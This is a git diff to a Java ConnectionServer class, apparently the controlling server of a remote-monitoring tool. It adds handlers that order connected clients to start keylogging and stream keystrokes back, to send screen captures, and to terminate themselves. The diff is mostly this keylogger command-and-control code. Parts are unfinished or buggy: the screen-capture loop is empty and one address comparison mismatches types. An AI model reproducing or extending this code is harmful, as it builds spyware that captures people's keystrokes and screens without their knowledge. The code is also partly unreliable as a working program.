@@ -51,6 +51,15 @@ public class ConnectionServer {
 		}
 	}
 
+	public synchronized void removeConnection(InetAddress client) {
+		// Finds the selected client and removes it
+		for (int i = 0; i < clients.size(); i++)
+			if (clients.get(i).getAddress().equals(client.getAddress())) {
+				clients.remove(i);
+				return;
+			}
+	}
+	
 	/**
 	 * Sends a request to a specific client computer. If there is an operation that
 	 * is progress, it will be cancelled
@@ -58,17 +67,19 @@ public class ConnectionServer {
 	 * @param header The header request to be made to the computer
 	 */
 	public synchronized void requestOperation(InetAddress client, String header) {
-		
+
 		// Clears all running thread operations
 		for (int i = 0; i < clients.size(); i++)
 			if (clients.get(i).isOperationRunning()) clients.get(i).killOperation();
-		
+
 		// Finds the requested thread
-		for (int i = 0; i < clients.size(); i++) {
-			if (clients.get(i))
-		}
+		for (int i = 0; i < clients.size(); i++)
+			if (clients.get(i).getAddress().equals(client.getHostAddress())) {
+				clients.get(i).requestOperation(header);
+				return;
+			}
 	}
-	
+
 	/**
 	 * Returns a list of all connected computers
 	 * @return List of the IP addresses of all connected clients
@@ -80,6 +91,10 @@ public class ConnectionServer {
 		return connectionList;
 	}
 
+	/**
+	 * Manages the connection between a client and the server
+	 * @author Caleb Choi
+	 */
 	private class Connection implements Runnable {
 
 		private Socket connection;
@@ -89,7 +104,7 @@ public class ConnectionServer {
 
 		private InputStreamReader input;
 		private DataOutputStream output;
-		
+
 		private Thread operation;
 
 		/**
@@ -118,24 +133,99 @@ public class ConnectionServer {
 		 * Requests a client operation. If there is one in progress, it will be killed
 		 * @param header
 		 */
-		public void requestOperation(String header) {
+		public void requestOperation(final String header) {
 			if (operation != null)
 				killOperation();
-			
-			if (header.equals(PacketHeader.KEYL)) {
+
+			if (header.equals(PacketHeader.KEYL)) { // Starts a new thread that listens for client keystrokes
+				operation = new Thread(new Runnable() {
+					@Override
+					public void run() {
+						try {
+							// Sends a request packet to the client to start keylogging functions
+							output.writeBytes(header + System.getProperty("line.separator"));
+
+							// Keep listening until thread is interrupted
+							BufferedReader bufferedInput = new BufferedReader(input);
+							while (!Thread.currentThread().isInterrupted()) {
+								if (input.ready()) {
+									String keystroke = bufferedInput.readLine();
+									System.out.print(keystroke);
+									// TODO add keystroke to GUI
+								}
+							}
+							
+							// Once thread is interrupted, send message to client to stop recording keystrokes
+							output.writeBytes(header + System.getProperty("line.separator"));
+							
+						} catch (IOException e) { // IOException means the client disconnected
+							System.out.println("CLIENT " + connection.getInetAddress().getHostAddress() + " DISCONNECTED");
+							try { // Will try to close all output streams
+								input.close();
+								output.close();
+								connection.close();
+								System.out.println("CLOSING CLIENT CONNECTION");
+							} catch (IOException e1) {System.out.println("CLIENT CONNECTION COULD NOT BE CLOSED");}
+							removeConnection(connection.getInetAddress());
+						}
+					}
+				});
+				operation.start();
 				
-			} else if (header.equals(PacketHeader.PICT)) {
+			} else if (header.equals(PacketHeader.PICT)) { // Tells client to send a screencap over
+				operation = new Thread(new Runnable() {
+					@Override
+					public void run() {
+						try {
+							// Sends a request packet to the client to send a screen capture
+							output.writeBytes(header + System.getProperty("line.separator"));
+
+							while (!Thread.currentThread().isInterrupted()) {
+
+							}
+						} catch (IOException e) { // IOException means the client disconnected
+							System.out.println("CLIENT " + connection.getInetAddress().getHostAddress() + " DISCONNECTED");
+							try { // Will try to close all output streams
+								input.close();
+								output.close();
+								connection.close();
+								System.out.println("CLOSING CLIENT CONNECTION");
+							} catch (IOException e1) {System.out.println("CLIENT CONNECTION COULD NOT BE CLOSED");}
+							removeConnection(connection.getInetAddress());
+						}
+					}
+				});
+				operation.start();
 				
-			} else if (header.equals(PacketHeader.KILL)) {
+			} else if (header.equals(PacketHeader.KILL)) { // Tells client to terminate its existence
 				
-			}
+				// Try to send a kill request to client
+				try {output.writeBytes(header + System.getProperty("line.separator"));} 
+				catch (IOException e) {System.out.println("KILL REQUEST WAS UNABLE TO BE SENT");}
+				
+				finally { // Regardless of whether the kill request was able to be sent, server closes client
+					System.out.println("CLIENT " + connection.getInetAddress().getHostAddress() + " DISCONNECTED");
+					try { // Will try to close all output streams
+						input.close();
+						output.close();
+						connection.close();
+						System.out.println("CLOSING CLIENT CONNECTION");
+					} catch (IOException e1) {System.out.println("CLIENT CONNECTION COULD NOT BE CLOSED");}
+					
+					// Removes connection from the 
+					removeConnection(connection.getInetAddress());
+				}
+			} else System.out.println("INVALID REQUEST HEADER - IGNORING REQUEST TO " + getAddress());
 		}
-		
+
+		/**
+		 * Returns a boolean indicating whether an operation is currently running
+		 * @return Boolean representing the state of an operation
+		 */
 		public boolean isOperationRunning() {
-			if (operation == null || operation.isInterrupted()) return false;
-			else return true;
+			return !(operation == null || operation.isInterrupted());
 		}
-		
+
 		/**
 		 * Stops the current operation if there is one
 		 */
@@ -145,7 +235,7 @@ public class ConnectionServer {
 				operation = null;
 			}
 		}
-		
+
 		@Override
 		public void run() {
 
@@ -153,9 +243,9 @@ public class ConnectionServer {
 			while (true) {
 				try {
 					// If there is input to be read
-					BufferedReader br = new BufferedReader(input);
+					BufferedReader bufferedInput = new BufferedReader(input);
 					if (input.ready()) {
-						String[] authMessage = br.readLine().split(" ");
+						String[] authMessage = bufferedInput.readLine().split(" ");
 
 						// Checks to see if the header and hash for authentication is valid
 						if (authMessage[0].equals(PacketHeader.AUTH)) {
@@ -185,7 +275,6 @@ public class ConnectionServer {
 						System.out.println("CONNECTION TERMINATED");
 					} catch (Exception ex) {
 						System.out.println("CONNECTION COULD NOT BE TERMINATED");}
-					System.out.println();
 					return;
 				}
 			}
@@ -204,8 +293,7 @@ public class ConnectionServer {
 				return;
 			}
 			System.out.println(clients.size() + " Connected clients");
-			System.out.println();
-			
+
 			// Updates the client list in the GUI
 			RemoteMonitorServer.updateClientList();
 
